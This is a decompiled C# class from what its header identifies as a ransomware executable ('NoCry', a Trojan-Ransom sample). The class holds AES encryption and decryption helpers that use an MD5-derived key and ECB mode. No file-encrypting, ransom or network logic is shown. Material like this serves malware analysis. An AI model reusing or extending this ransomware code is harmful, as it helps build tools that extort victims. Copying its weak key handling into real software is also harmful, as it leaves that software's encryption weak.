// Decompiled with JetBrains decompiler
// Type: NoCry.check
// Assembly: NoCry, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: BD7384EC-1348-457C-BEC6-7E1381E8F337
// Assembly location: C:\Users\Administrateur\Downloads\ransomware_new\HEUR-Trojan-Ransom.Win32.Generic-67f972536102feb9b3de184c34d9f8b1114c1c38ab3fbb15bb0419043f68a913.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Security.Cryptography;
using System.Text;

namespace NoCry
{
  public class check
  {
    public static object AES_Encrypt(string input, string pass)
    {
      RijndaelManaged rijndaelManaged = new RijndaelManaged();
      MD5CryptoServiceProvider cryptoServiceProvider = new MD5CryptoServiceProvider();
      object base64String;
      try
      {
        byte[] destinationArray = new byte[32];
        byte[] hash = cryptoServiceProvider.ComputeHash(check.SB(pass));
        Array.Copy((Array) hash, 0, (Array) destinationArray, 0, 16);
        Array.Copy((Array) hash, 0, (Array) destinationArray, 15, 16);
        rijndaelManaged.Key = destinationArray;
        rijndaelManaged.Mode = CipherMode.ECB;
        ICryptoTransform encryptor = rijndaelManaged.CreateEncryptor();
        byte[] inputBuffer = check.SB(input);
        base64String = (object) Convert.ToBase64String(encryptor.TransformFinalBlock(inputBuffer, 0, inputBuffer.Length));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return base64String;
    }

    public static bool AES_Decrypt(string input, string pass)
    {
      RijndaelManaged rijndaelManaged = new RijndaelManaged();
      MD5CryptoServiceProvider cryptoServiceProvider = new MD5CryptoServiceProvider();
      string str = "";
      bool flag;
      try
      {
        byte[] destinationArray = new byte[32];
        byte[] hash = cryptoServiceProvider.ComputeHash(check.SB(pass));
        Array.Copy((Array) hash, 0, (Array) destinationArray, 0, 16);
        Array.Copy((Array) hash, 0, (Array) destinationArray, 15, 16);
        rijndaelManaged.Key = destinationArray;
        rijndaelManaged.Mode = CipherMode.ECB;
        ICryptoTransform decryptor = rijndaelManaged.CreateDecryptor();
        byte[] inputBuffer = Convert.FromBase64String(input);
        str = check.BS(decryptor.TransformFinalBlock(inputBuffer, 0, inputBuffer.Length));
        flag = true;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        flag = false;
        ProjectData.ClearProjectError();
      }
      return flag;
    }

    public static object AES_Decrypttt(string input, string pass)
    {
      RijndaelManaged rijndaelManaged = new RijndaelManaged();
      MD5CryptoServiceProvider cryptoServiceProvider = new MD5CryptoServiceProvider();
      object obj;
      try
      {
        byte[] destinationArray = new byte[32];
        byte[] hash = cryptoServiceProvider.ComputeHash(check.SB(pass));
        Array.Copy((Array) hash, 0, (Array) destinationArray, 0, 16);
        Array.Copy((Array) hash, 0, (Array) destinationArray, 15, 16);
        rijndaelManaged.Key = destinationArray;
        rijndaelManaged.Mode = CipherMode.ECB;
        ICryptoTransform decryptor = rijndaelManaged.CreateDecryptor();
        byte[] inputBuffer = Convert.FromBase64String(input);
        obj = (object) check.BS(decryptor.TransformFinalBlock(inputBuffer, 0, inputBuffer.Length));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return obj;
    }

    public static byte[] SB(string s) => Encoding.UTF8.GetBytes(s);

    public static string BS(byte[] b) => Encoding.UTF8.GetString(b);
  }
}
